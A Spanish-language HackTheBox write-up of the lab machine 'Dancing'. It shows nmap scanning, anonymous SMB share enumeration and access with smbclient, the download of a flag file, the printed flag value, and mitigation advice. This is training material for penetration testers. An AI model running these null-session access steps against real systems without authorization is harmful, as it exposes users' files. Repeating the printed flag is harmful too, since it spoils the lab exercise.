---
layout: post
title: HTB — Dancing
date: 2026-05-06
platform: HackTheBox
difficulty: very-easy
description: SMB
tags:
  - SMB
  - Windows
---

## Introducción

**Dancing** sigue el mismo patrón que Meow y Fawn: un servicio expuesto, mal configurado, con acceso sin credenciales. Esta vez el protagonista es **SMB** (Server Message Block), el protocolo que Windows usa para compartir archivos, impresoras y recursos en red.

----
## Reconocimiento

Verificamos que la máquina responde utilizando un ``ping``:

```bash
ping -c 1 10.129.x.x
```

La primer regla del pentestig: **nunca supongas nada, siempre escanea**. Primero deseo saber que servicios están corriendo en el objetivo. Para eso uso ``nmap``:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
```

**Flags utilizadas:**
+ `-p-` — Escanea los 65535 puertos
- `-sS` — SYN scan (sigiloso, no completa el hanshake TCP)
- `--open` — Muestra solo puertos abiertos
- `--min-rate` - Envía mínimo 5000 paquetes por segundo
- `-vvv` - Verbose: muestra resultados en tiempo real
- `-n` - Sin resolución DNS (más rápido)
- `-Pn` - Omite el host discovery (asume que el host está activo)\
- `-oG` - Guarda el output en formato Grepeable

**Información relevante:**
```bash
PORT    STATE  SERVICE
135/tcp open   msrpc
139/tcp open   netbios-ssn
445/tcp open   microsoft-ds  
```

Nos encontramos tres puertos abiertos. El que nos interesa inmediatamente es el **445**, que corresponde a SMB. Los puertos 135 y 139 son parte del stack NetBIOS/RPC de Windows, normales en cualquier máquina con SMB activo.

Realizo un escaneo de versión  y servicios en los puertos encontrados:

```bash
nmap -sCV -p135,139,445 10.129.x.x -oN target
```

**Flags utilizadas:**
+ `-sC` — ejecuta scripts de detección por defecto
- `-sV` — detecta versiones de los servicios
- `-oN` — guarda el output en un archivo de texto

**Información relevante:**

```bash
PORT    STATE  SERVICE         VERSION 
445/tcp open   microsoft-ds?

Host script results:
| smb2-security-mode
|  3.1.1
|   Message signing enabled but not required
```
SMB activo, firma de mensajes no requerida.

---

## Enumeración
Antes de intentar conectarnos, enumeramos los recursos compartidos disponibles. ``smbclient `` permite listar recursos sin necesidad de credenciales utilizando una **null session**:

```bash
smbclient -L 10.129.x.x -N
```

+ ``-L`` - lista los recursos compartidos disponibles en el host
+ ``-N`` - no solicita contraseña (null session / sesión anónima)

Output:
```bash
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
```

Encontramos 4 recursos. Los tres primeros (``ADMIN$``, ``C$``, ``IPC$``) son recursos administrativos por defecto de Windows, normalmente protegidos. El que llama la atención es **WorkShares**: sin comentario, sin indicaciones de protección.

----
## Explotación
Intento conectarme a ``WorkShares`` sin contrasea:

```bash
smbclient \\\\10.129.x.x\WorkShares -N
#  \\\\host\\share     Ruta al recurso compartido (doble barrra por escape en bash)
# -N                   Sin contraseña
```

```bash
Try "help" to get a list of possible commands.
smb: \>
```

Logramos acceder. Listamos contenido:
```bash
smb: \> ls
  .                                   D        0
  ..                                  D        0
  Amy.J                               D        0
  James.P                             D        0
```

Dos directorios de usuarios. Revisamos uno por uno:

```bash
smb: \> cd James.P
smb: \James.P\> ls
  flag.txt         A      32
```

La flag está en el directorios de James. Lo descargamos:
```bash
smb: \James.P\> get flag.txt
# get    Descarga el archivo al directorio local
```

---
# Flag
Una vez dentro, localizamos la flag:

```bash
cat flag.txt
# 5f61c10dffbc77a704d76016a22f1664
```

### ¿Qué aprendemos de esto?

Dancing introduce un servicio que no desaparece en entornos reales: **SMB mal configurado es uno de los hallazgos más frecuentes en auditorías de red interna**.

**Las null sessions son un problema vigente.** Permitir que un cliente SMB se conecte sin credenciales y liste recursos es una configuración que debería estar deshabilitada en cualquier entorno productivo. En este caso no solo se listan los shares, sino que se accede a archivos de usuarios reales.

**Los shares administrativos necesitan protección explícita.** `ADMIN$` y `C$` estaban protegidos, pero `WorkShares` no. Un share creado para "facilitar el trabajo" y olvidado sin restricciones de acceso es una puerta abierta.

**SMB tiene historia pesada.** EternalBlue (MS17-010), NotPetya, WannaCry — todos explotaron SMB. No hace falta llegar a ese nivel para causar daño. Acceso de lectura a directorios de usuarios ya puede exponer credenciales, documentos internos o información suficiente para moverse lateralmente en la red.

---
### Resumen técnico

| Elemento        | Detalle                                                                                                                     |
| --------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Puerto          | 445/tcp (SMV)                                                                                                               |
| Vulnerabilidad  | Null session en SMB, share sin autenticación                                                                                |
| Acceso obtenido | Lectura de archivos sin credenciales                                                                                        |
| Herramientas    | `nmap`, `smbclient`                                                                                                         |
| Mitigación      | Deshabilitar null sessions, requerir autenticación en todos los recursos compartidos, auditar permisos de SMB regularmente. |
